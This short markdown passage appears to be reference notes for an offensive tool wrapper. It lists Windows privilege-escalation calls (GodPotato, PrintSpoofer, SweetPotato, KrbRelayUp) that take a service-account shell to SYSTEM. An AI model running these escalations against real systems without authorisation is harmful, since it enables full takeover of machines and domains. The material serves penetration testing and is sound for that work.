## Local Privilege Escalation

When you have a shell but need SYSTEM (e.g., SeImpersonatePrivilege):

### Potato Attacks
For service accounts with SeImpersonate/SeAssignPrimaryToken:
```
# GodPotato (most reliable, works on modern Windows)
god_potato(command="cmd /c whoami")
→ Execute as SYSTEM

# PrintSpoofer (Windows 10/Server 2016-2019)
print_spoofer(command="cmd /c whoami")
→ SYSTEM via print spooler

# SweetPotato (combines multiple techniques)
sweet_potato(command="cmd /c whoami")
→ Tries multiple potato variants
```

### KrbRelayUp
Local privilege escalation via Kerberos relay (requires LDAP signing disabled):
```
krb_relay_up(
    target_dc="dc.domain.com",
    computer_name="YOURPC$",
    computer_pass="Pass123!"  # pragma: allowlist secret
)
→ SYSTEM via RBCD self-relay
```

